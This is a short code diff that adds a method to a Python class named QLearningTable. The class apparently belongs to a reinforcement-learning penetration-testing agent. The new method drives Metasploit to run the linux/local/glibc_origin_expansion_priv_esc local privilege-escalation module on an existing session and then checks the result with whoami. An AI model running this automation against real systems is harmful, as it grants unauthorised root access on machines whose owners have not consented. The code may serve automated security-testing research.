@@ -456,6 +456,36 @@ class QLearningTable:
         else:
             return False, 'Not root'
         
+    def glibc_origin_expansion_priv_esc(self):
+        if self.session >0:
+            self.background()
+            self.console.execute('use linux/local/glibc_origin_expansion_priv_esc')
+            time.sleep(4)
+            self.console.execute('set session ' + self.session)
+            time.sleep(4)
+            self.console.execute('run')
+            time.sleep(20)
+            
+            a= self.success
+                
+            if a:
+                #VERIFIER SI C'EST BIEN COMME CELA QUE FONCTIONNE L'EXPLOIT, C'EST A DIRE S'IL CREE UNE NOUVELLE SESSION ET PUIS IL FAUT SE CONNECTER A CETTE SESSION
+                self.console.execute('sessions -i ' + str(self.session))
+                time.sleep(4)
+                self.console.execute('whoami')
+                time.sleep(4)
+            
+            b= self.whoami
+        
+            #while self.global_console_status:
+            #while console.console.read()['busy']:
+            #time.sleep(2)
+            return a, b
+            
+        else:
+            return False, 'Not root'
+        
+        
     def ls(self):
         self.console.execute('ls')
         time.sleep(3)
